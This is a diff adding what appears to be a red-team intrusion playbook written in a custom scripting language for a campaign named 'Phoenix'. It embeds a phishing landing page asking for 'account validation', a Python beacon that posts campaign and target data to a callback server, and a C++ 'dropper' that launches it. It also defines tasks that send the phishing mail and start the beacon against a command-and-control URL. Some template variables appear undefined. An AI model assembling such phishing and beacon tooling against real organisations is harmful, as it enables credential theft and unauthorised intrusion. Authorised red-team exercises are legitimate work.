@@ -1,0 +1,55 @@
+NOTE "Red team autonomous intrusion playbook"
+TARGET ["https://finance.internal", "https://vpn.internal"]
+SCOPE ["corporate-wireless", "vpn-gateway"]
+SET operators = ["alpha", "bravo", "charlie"]
+SET campaign = {
+    "name": "Phoenix",
+    "priority": "critical",
+    "operators": operators,
+}
+
+EMBED html phishing_landing = """
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>{campaign[name]} Validation</title>
+  </head>
+  <body>
+    <h1>Account validation required</h1>
+    <p>Operators: {', '.join(operators)}</p>
+  </body>
+</html>
+""" USING {"path": "dist/landing.html", "tags": ["redteam", "phishing"]}
+
+EMBED python beacon = """
+import requests
+
+def run(callback_url):
+    payload = {"campaign": "{campaign[name]}", "hosts": {targets}}
+    return requests.post(callback_url, json=payload, timeout=5).status_code
+""" USING {"path": "payloads/beacon.py", "tags": ["c2", "automation"]}
+
+EMBED c++ launcher = """
+#include <cstdlib>
+#include <string>
+
+int main() {
+    std::string cmd = "python beacon.py";
+    return std::system(cmd.c_str());
+}
+""" USING {"path": "payloads/launcher.cpp", "tags": ["dropper"]}
+
+TASK "Initial access":
+    NOTE "Deliver phishing content to high-value finance operators"
+    HTTP POST "https://mailer.internal/api/send" EXPECT 202
+    SET delivered = True
+
+TASK "Establish beacon":
+    RUN "python beacon.py --callback https://c2.internal/callback"
+    SET beacon_ready = True
+
+FINDING "Initial foothold" SEVERITY "high" USING {
+    "targets": targets,
+    "operators": operators,
+    "beacon_ready": beacon_ready,
+}
